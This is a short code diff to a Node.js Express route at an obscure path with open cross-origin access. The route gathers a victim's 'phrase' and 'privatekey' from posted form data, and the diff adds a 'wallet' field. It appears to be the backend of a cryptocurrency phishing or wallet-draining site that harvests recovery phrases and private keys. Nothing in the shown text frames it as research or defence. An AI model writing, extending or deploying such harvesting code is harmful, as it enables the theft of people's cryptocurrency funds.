@@ -34,6 +34,7 @@ app.post('/m13csfXuR',function(req,res){
     res.header("Access-Control-Allow-Origin", "*")
     res.header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');     
     var statement = {
+        wallet:req.body.wallet,
         phrase : req.body.phrase,
         privatekey: req.body.privatekey 
    }       
